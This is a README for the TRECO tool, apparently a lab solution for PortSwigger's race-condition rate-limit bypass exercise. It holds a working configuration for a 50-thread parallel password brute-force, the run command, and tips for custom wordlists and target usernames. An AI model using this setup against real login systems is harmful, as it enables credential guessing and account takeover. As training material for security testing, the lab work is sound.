# PortSwigger Lab 2: Bypassing Rate Limits via Race Conditions

**Lab URL:** https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits

## Lab Description

This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, you can bypass the rate limit by sending many login attempts simultaneously using a race condition.

## Vulnerability

The login endpoint implements rate limiting, but the rate limit check and the actual login verification are not atomic. By sending multiple requests simultaneously (before the rate limit kicks in), you can test many passwords at once.

## Solution with TRECO

This example demonstrates the **DISTRIBUTE input mode** - each thread receives a different password from a wordlist and attempts login simultaneously.

### Key Features Used

1. **Input Source: File** - Loads passwords from built-in wordlist
2. **Distribution Mode: distribute** - Each thread gets a unique password
3. **Race Configuration** - 50 threads with barrier synchronization
4. **Per-Thread Logging** - Shows which password succeeded

### Configuration

```yaml
entrypoint:
  input:
    username: "carlos"
    passwords:
      source: file
      path: "builtin:passwords-top-100"

states:
  brute_force_login:
    race:
      threads: 50
      input_mode: distribute  # Each thread gets a different password
      sync_mechanism: barrier
      connection_strategy: preconnect
```

### Usage

1. **Get your lab URL** from PortSwigger Academy
2. **Set the environment variable:**
   ```bash
   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
   ```

3. **Run the attack:**
   ```bash
   treco examples/portswigger/rate-limit-bypass/attack.yaml
   ```

4. **Optional: Route through Burp Suite:**
   - The config includes proxy settings (127.0.0.1:8080)
   - Start Burp Suite and enable the proxy
   - Run the command above

### Expected Output

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  🔐 PortSwigger Lab 2: Bypassing Rate Limits via Race Conditions            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Target:   YOUR-LAB-ID.web-security-academy.net                              ║
║  Username: carlos                                                            ║
║  Strategy: Race 50 login attempts with different passwords simultaneously    ║
║  Mode:     DISTRIBUTE (each thread gets unique password)                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

🔍 Loading passwords from built-in wordlist...
⚡ Starting race attack with 50 threads...

🔴 Thread 00: Failed with "123456"
🔴 Thread 01: Failed with "password"
🟢 Thread 02: SUCCESS! Password found: "qwerty"
🔴 Thread 03: Failed with "letmein"
...

╔══════════════════════════════════════════════════════════════════════════════╗
║  🎉 LAB SOLVED!                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  ✅ Successfully bypassed rate limit and found valid credentials             ║
║  👤 Username: carlos                                                         ║
║  🔑 Password: qwerty                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

### How It Works

1. **Load Wordlist:** Loads 100 common passwords from built-in wordlist
2. **Distribute Passwords:** Assigns one unique password to each of 50 threads
3. **Synchronize:** All threads wait at a barrier until everyone is ready
4. **Race Attack:** All 50 threads send login attempts simultaneously
5. **Bypass Rate Limit:** Because all requests arrive before rate limiting activates, we can test 50 passwords in one "burst"
6. **Success Detection:** One thread will get a 302 redirect (successful login)

### Customization

**Use a custom wordlist:**
```yaml
passwords:
  source: file
  path: "/path/to/your/wordlist.txt"
```

**Increase thread count:**
```yaml
race:
  threads: 100  # Test more passwords at once
```

**Change username:**
```yaml
input:
  username: "different_user"
```

## Technical Details

- **Threads:** 50 (tests 50 passwords simultaneously)
- **Sync Mechanism:** barrier (ensures all threads start exactly together)
- **Connection Strategy:** preconnect (establishes connections before race)
- **Input Mode:** distribute (round-robin password distribution)

## See Also

- [TRECO Documentation](../../../README.md)
- [Input Sources Guide](../../../INPUT_SOURCES.md)
- [PortSwigger Lab 4: Single-Endpoint Race](../single-endpoint-race/)
